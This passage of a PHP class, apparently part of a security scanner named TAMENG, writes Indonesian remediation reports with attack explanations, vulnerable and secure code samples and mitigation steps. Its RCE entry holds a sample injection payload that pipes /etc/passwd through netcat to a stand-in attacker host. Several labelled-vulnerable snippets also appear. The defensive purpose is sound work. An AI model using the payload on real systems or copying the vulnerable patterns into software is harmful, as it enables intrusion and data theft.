                'attack_vector' => "1. Penyerang menyusupi server CDN penyedia pustaka (supply-chain attack) dan menyisipkan skrip malware ke library yang di-hosting.\n2. Saat pengguna memuat aplikasi Anda, browser mengunduh dan mengeksekusi pustaka yang telah dimodifikasi tanpa verifikasi hash kriptografi.",
                'impact' => 'Eksekusi JavaScript berbahaya di seluruh browser pengunjung dan kegagalan integritas rantai pasok perangkat lunak (supply chain).',
                'verification' => 'curl -s https://' . ($finding->endpoint ?: 'example.com') . ' | grep -E "<script|<link" | grep -v "integrity="',
            ],
            'rce' => [
                'summary' => 'Penggunaan fungsi berbahaya yang dapat mengeksekusi perintah shell sistem operasi secara langsung menggunakan argumen input pengguna.',
                'cause' => 'Aplikasi memanggil fungsi exec(), shell_exec(), system(), atau eval() dengan parameter yang dapat dikontrol oleh pengguna luar.',
                'attack_vector' => "1. Penyerang mengirimkan karakter pemisah perintah shell (seperti ; && | `).\n2. Contoh payload: '127.0.0.1; cat /etc/passwd | nc attacker.com 4444'.\n3. Server mengeksekusi reverse shell dan memberikan akses terminal jarak jauh ke penyerang.",
                'impact' => 'Kompromi server total (Full Root/System Takeover), pemasangan backdoor, lateral movement ke server database internal, dan penghapusan data sistem.',
                'verification' => 'Audit pemanggilan fungsi exec/shell_exec/system pada seluruh kode sumber repositori.',
            ],
            'vulnerable_dependency' => [
                'summary' => 'Komponen dependensi / library pihak ketiga yang terdaftar pada manifest proyek memiliki celah keamanan publik yang telah tercatat dalam database CVE/NVD.',
                'cause' => 'Versi library pada composer.json / package.json / Dockerfile sudah usang dan belum diperbarui ke rilis patch yang aman.',
                'attack_vector' => "1. Penyerang meninjau komponen open-source yang digunakan aplikasi Anda dan mencocokkannya dengan database exploit publik.\n2. Penyerang menggunakan public PoC exploit yang menargetkan kerentanan pada versi library tersebut.",
                'impact' => 'Bergantung pada CVE terkait, mulai dari Denial of Service (DoS), bypass autentikasi, hingga Remote Code Execution (RCE).',
                'verification' => 'composer audit (atau npm audit)',
            ],
            default => [
                'summary' => "Ditemukan indikasi kelemahan keamanan teknis pada aturan {$finding->rule_id}.",
                'cause' => 'Implementasi kode sumber atau konfigurasi server belum memenuhi panduan pengamanan minimum OWASP / CIS Benchmarks.',
                'attack_vector' => "Penyerang menganalisis respon server atau struktur endpoint untuk menemukan kelemahan logika dan memanipulasi parameter sistem.",
                'impact' => 'Penurunan postur keamanan aplikasi dan potensi kebocoran data atau gangguan layanan.',
                'verification' => 'Jalankan ulang scanner TAMENG setelah perbaikan kode diterapkan.',
            ],
        };
    }

    private function buildCodePatch(Finding $finding, array $category, string $fileExt): array
    {
        $filePath = $finding->file_path ?: ($finding->endpoint ? 'Konfigurasi Web Server' : 'src/SecurityConfig.' . $fileExt);

        return match ($category['type']) {
            'clickjacking' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/conf.d/security.conf (atau .htaccess)',
                'vulnerable_code' => "# KONDISI RENTAN:\n# Web server belum mengirimkan header anti-framing X-Frame-Options",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX:\nadd_header X-Frame-Options \"SAMEORIGIN\" always;\nadd_header Content-Security-Policy \"frame-ancestors 'self';\" always;\n\n# ATAU PADA APACHE (.htaccess):\nHeader always set X-Frame-Options \"SAMEORIGIN\"\nHeader always set Content-Security-Policy \"frame-ancestors 'self';\"",
            ],
            'csp_missing' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/conf.d/security.conf (atau Middleware)',
                'vulnerable_code' => "# KONDISI RENTAN:\n# Tidak ada deklarasi kebijakan pemuatan sumber daya eksternal",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX:\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self'; frame-ancestors 'self';\" always;\n\n# ATAU PADA LARAVEL MIDDLEWARE:\n\$response->headers->set('Content-Security-Policy', \"default-src 'self'; script-src 'self';\");",
            ],
            'x_content_type_options' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/conf.d/security.conf',
                'vulnerable_code' => "# KONDISI RENTAN:\n# Browser klien diizinkan menebak MIME-type secara otomatis (MIME-sniffing)",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX:\nadd_header X-Content-Type-Options \"nosniff\" always;\n\n# ATAU PADA APACHE (.htaccess):\nHeader always set X-Content-Type-Options \"nosniff\"",
            ],
            'hsts_missing' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/conf.d/ssl.conf',
                'vulnerable_code' => "# KONDISI RENTAN:\n# HTTPS aktif tetapi koneksi awal via HTTP tidak dipaksa migrasi permanen",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX (Blok Server Port 443 SSL):\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n\n# PASTIKAN JUGA OTOMATIS REDIRECT DARI PORT 80 KE HTTPS:\nserver {\n    listen 80;\n    server_name example.com www.example.com;\n    return 301 https://\$host\$request_uri;\n}",
            ],
            'permissions_policy' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/conf.d/security.conf',
                'vulnerable_code' => "# KONDISI RENTAN:\n# Fitur hardware browser (camera, mic, geolocation) tidak dibatasi",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX:\nadd_header Permissions-Policy \"camera=(), microphone=(), geolocation=(), payment=()\" always;",
            ],
            'coep_coop' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/conf.d/security.conf',
                'vulnerable_code' => "# KONDISI RENTAN:\n# Halaman dokumen tidak diisolasi dari resource lintas-domain",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX:\nadd_header Cross-Origin-Embedder-Policy \"require-corp\" always;\nadd_header Cross-Origin-Opener-Policy \"same-origin\" always;\nadd_header Cross-Origin-Resource-Policy \"same-origin\" always;",
            ],
            'weak_ssl_ciphers' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/nginx.conf',
                'vulnerable_code' => "# KONDISI RENTAN (Protokol dan cipher lawas masih diizinkan):\nssl_protocols TLSv1 TLSv1.1 TLSv1.2;\nssl_ciphers ALL:!aNULL:!eNULL;",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX (Standar Mozilla Modern/Intermediate):\nssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;\nssl_prefer_server_ciphers on;\nssl_session_cache shared:SSL:10m;\nssl_session_timeout 1d;",
            ],
            'cache_control' => [
                'language' => 'php',
                'file_path' => 'app/Http/Middleware/PreventBackHistory.php',
                'vulnerable_code' => "// KONDISI RENTAN:\n// Respon data profil/akun disimpan di cache browser publik",
                'secure_code' => "// SOLUSI PERBAIKAN PADA LARAVEL MIDDLEWARE / HTTP RESPONSE:\n\$response->headers->set('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');\n\$response->headers->set('Pragma', 'no-cache');\n\$response->headers->set('Expires', 'Sat, 01 Jan 2000 00:00:00 GMT');",
            ],
            'secret_leak' => [
                'language' => $fileExt,
                'file_path' => $filePath,
                'vulnerable_code' => "// KODE RENTAN (Kunci rahasia tertulis langsung di kode sumber):\n\$apiKey = \"ghp_9843hf98hf29h3f928h3982h39f28\";\n\$dbPassword = \"super_secret_production_password\";",
                'secure_code' => "// KODE AMAN (Memanfaatkan Environment Variables & Secret Manager):\n\$apiKey = config('services.github.token') ?: env('GITHUB_API_TOKEN');\n\$dbPassword = env('DB_PASSWORD');\n\n// Pastikan file .env telah terdaftar pada berkas .gitignore!",
            ],
            'sql_injection' => [
                'language' => $fileExt,
                'file_path' => $filePath,
                'vulnerable_code' => "// KODE RENTAN (Konkatenasi string variabel langsung ke query SQL):\n\$query = DB::select(\"SELECT * FROM users WHERE email = '\" . \$request->input('email') . \"'\");",
                'secure_code' => "// KODE AMAN (Menggunakan Parameter Binding / Eloquent ORM):\n\$user = User::where('email', \$request->input('email'))->first();\n\n// Atau jika menggunakan raw query, gunakan prepared parameter binding:\n\$query = DB::select(\"SELECT * FROM users WHERE email = ?\", [\$request->input('email')]);",
            ],
            'xss' => [
                'language' => $fileExt,
                'file_path' => $filePath,
                'vulnerable_code' => "// KODE RENTAN:\necho \"<div>Selamat datang, \" . \$_GET['name'] . \"</div>\";\n// Pada Vue/React: <div v-html=\"userInput\"></div>",
                'secure_code' => "// KODE AMAN (HTML Escaping):\necho \"<div>Selamat datang, \" . htmlspecialchars(\$_GET['name'], ENT_QUOTES, 'UTF-8') . \"</div>\";\n// Pada Vue/React: <div>{{ userInput }}</div> atau gunakan DOMPurify.sanitize(userInput)",
            ],
            'sri_missing' => [
                'language' => 'html',
                'file_path' => $filePath,
                'vulnerable_code' => "<!-- KODE RENTAN (Tanpa verifikasi hash kriptografi): -->\n<script src=\"https://code.jquery.com/jquery-3.7.1.min.js\"><" . "/script>",
                'secure_code' => "<!-- KODE AMAN (Dengan Subresource Integrity hash): -->\n<script src=\"https://code.jquery.com/jquery-3.7.1.min.js\"\n        integrity=\"sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=\"\n        crossorigin=\"anonymous\"><" . "/script>",
            ],
            'rce' => [
                'language' => $fileExt,
                'file_path' => $filePath,
                'vulnerable_code' => "// KODE RENTAN (Input pengguna diteruskan langsung ke shell sistem):\n\$target = \$_GET['ip'];\nexec(\"ping -c 4 \" . \$target, \$output);",
                'secure_code' => "// KODE AMAN (Validasi format ketat dan escapeshellarg):\n\$target = filter_var(\$_GET['ip'], FILTER_VALIDATE_IP);\nif (!\$target) {\n    throw new InvalidArgumentException('Alamat IP tidak valid.');\n}\nexec(escapeshellcmd(\"ping -c 4 \" . escapeshellarg(\$target)), \$output);",
            ],
            'vulnerable_dependency' => [
                'language' => $fileExt === 'json' ? 'json' : 'bash',
                'file_path' => $fileExt === 'json' ? 'composer.json / package.json' : 'Terminal CLI',
                'vulnerable_code' => "# Versi library lama yang memiliki catatan CVE kerentanan:\ncomposer require vendor/package:1.2.0",
                'secure_code' => "# Perbarui dependensi ke versi patch terbaru yang telah diperbaiki:\ncomposer update vendor/package\n# Atau pada Node.js:\nnpm audit fix",
            ],
            default => [
                'language' => 'nginx',
                'file_path' => 'Konfigurasi Web Server / Source Code',
                'vulnerable_code' => "# Tinjau baris kode atau konfigurasi terkait pada aturan " . ($finding->rule_id ?? 'keamanan'),
                'secure_code' => "# Terapkan validasi parameter masukan, aktifkan security headers, dan batasi hak akses",
            ],
        };
    }

    private function buildMitigationSteps(Finding $finding, array $category): array
    {
        return match ($category['type']) {
            'clickjacking' => [
                'Tambahkan header `X-Frame-Options: SAMEORIGIN` pada konfigurasi Nginx/Apache atau middleware HTTP.',
                'Jika website perlu disematkan oleh domain mitra tertentu, gunakan direktif CSP `frame-ancestors \'self\' https://trusted-partner.com`.',
                'Uji kembali menggunakan perintah `curl -I <URL>` untuk memastikan header terkirim pada setiap respon HTTP.',
            ],
            'csp_missing' => [
                'Terapkan kebijakan CSP bertahap, mulai dari mode `Content-Security-Policy-Report-Only` untuk memetakan resource yang dimuat.',
                'Hindari penggunaan direktif `\'unsafe-inline\'` dan `\'unsafe-eval\'` guna mencegah eksekusi skrip injeksi.',
                'Aktifkan header `Content-Security-Policy` final pada konfigurasi Nginx atau middleware backend.',
            ],
            'x_content_type_options' => [
                'Tambahkan header `X-Content-Type-Options: nosniff` pada level global web server.',
                'Pastikan web server selalu mengirimkan header `Content-Type` yang tepat untuk setiap berkas statis (misal image/png, application/json).',
            ],
            'hsts_missing' => [
                'Pastikan seluruh sertifikat SSL/TLS valid dan terpasang dengan benar tanpa chain error.',
                'Tambahkan header `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` pada blok server port 443.',
                'Tambahkan aturan redirect otomatis 301 dari HTTP (port 80) ke HTTPS (port 443).',
            ],
            'permissions_policy' => [
                'Tambahkan header `Permissions-Policy` dengan mematikan fitur hardware yang tidak digunakan (contoh: `camera=(), microphone=(), geolocation=()`).',
                'Terapkan pada level reverse proxy Nginx atau Cloudflare.',
            ],
            'coep_coop' => [
                'Pasang header `Cross-Origin-Embedder-Policy: require-corp` dan `Cross-Origin-Opener-Policy: same-origin`.',
                'Verifikasi bahwa aset eksternal (CDN/font) mendukung header CORS `Cross-Origin-Resource-Policy`.',
            ],
            'weak_ssl_ciphers' => [
                'Nonaktifkan protokol usang SSLv2, SSLv3, TLS 1.0, dan TLS 1.1 pada file konfigurasi Nginx/Apache.',
                'Aktifkan hanya TLS 1.2 dan TLS 1.3 dengan cipher modern berbasis AEAD (GCM / Poly1305).',
                'Jalankan uji SSL Labs atau TestSSL untuk memastikan rating SSL mencapai nilai A+.',
            ],
            'cache_control' => [
                'Pada halaman yang memuat data pengguna atau formulir autentikasi, set header `Cache-Control: no-store, no-cache, must-revalidate`.',
                'Hanya izinkan caching (`public, max-age=...`) pada aset statis publik seperti gambar, CSS, dan file JavaScript yang tidak memuat token rahasia.',
            ],
            'secret_leak' => [
                'Segera lakukan REVOKE / ROTASI pada token yang bocor melalui provider terkait.',
                'Pindahkan nilai kredensial ke file `.env` atau Secret Manager terpusat (HashiCorp Vault / AWS Secrets Manager).',
                'Periksa riwayat git commit menggunakan `git-filter-repo` atau BFG Repo-Cleaner untuk menghapus jejak rahasia dari histori git.',
                'Pasang pre-commit hook (misalnya Gitleaks) agar rahasia tidak ter-commit lagi di masa mendatang.',
            ],
            'sql_injection' => [
                'Ganti semua query string manual dengan Parameterized Prepared Statements atau ORM (Eloquent / Prisma).',
                'Hindari penggunaan interpolasi variabel langsung di dalam klausa `DB::raw()`, `WHERE`, atau `ORDER BY`.',
                'Validasi tipe data input (misal pastikan integer menggunakan `validate([\'id\' => \'integer\'])`).',
            ],
            'xss' => [
                'Gunakan mekanisme escaping otomatis template engine (misal `{{ $var }}` di Blade atau `{{ var }}` di Vue).',
                'Hindari penggunaan method `v-html`, `dangerouslySetInnerHTML`, atau `{!! $var !!}` pada data input publik.',
                'Terapkan sanitasi HTML menggunakan library DOMPurify sebelum merender HTML dinamis.',
            ],
            'sri_missing' => [
                'Hitung hash digest kriptografi berkas (sha384 atau sha512) dari library CDN yang dimuat.',
                'Tambahkan atribut `integrity="sha384-..."` dan `crossorigin="anonymous"` pada tag `<script>` atau `<link>`.',
                'Rekomendasi terbaik: Unduh pustaka ke repositori lokal (self-hosted bundle via npm/Vite) untuk menghilangkan ketergantungan CDN eksternal.',
            ],
            'rce' => [
                'Hindari pemanggilan shell sistem operasi jika tersedia fungsi native di bahasa pemrograman.',
                'Jika eksekusi shell tidak dapat dihindari, gunakan validasi whitelist ketat dan bungkus argumen dengan `escapeshellarg()`.',
                'Jalankan proses web worker dengan hak akses pengguna sistem operasi minimal (least privilege).',
            ],
            'vulnerable_dependency' => [
                'Jalankan `composer update` atau `npm audit fix` untuk menaikkan versi paket ke versi yang telah ditambal.',
                'Pastikan file `composer.lock` atau `package-lock.json` di-commit ke repositori git.',
                'Aktifkan dependabot atau automated vulnerability scanning pada pipeline CI/CD.',
            ],
            default => [
                'Lakukan code review terfokus pada lokasi berkas dan baris yang dilaporkan oleh scanner.',
                'Terapkan prinsip least privilege (hak akses minimal) dan validasi input berlapis (defense-in-depth).',
                'Tambahkan automated security unit test untuk mencegah regresi di masa mendatang.',
            ],
        };
    }

    private function buildOwaspGuidance(Finding $finding): array
    {
        return [
            'top_10_category' => $finding->owasp ?: 'OWASP Top 10 Application Security Risks',
            'defense_in_depth' => 'Terapkan validasi input ketat (Positive Validation), otorisasi berlapis (RBAC/ABAC), dan enkripsi data end-to-end.',
            'verification_method' => 'Jalankan ulang pemindaian TAMENG (Re-run Scan) setelah menerapkan perbaikan untuk memastikan kerentanan telah bersih.',
        ];
    }

    private function defaultCvss(string $severity): float
    {
        return match (strtolower($severity)) {
            'critical' => 9.8,
            'high' => 8.2,
            'medium' => 5.5,
            'low' => 3.1,
            default => 0.0,
        };
    }
}
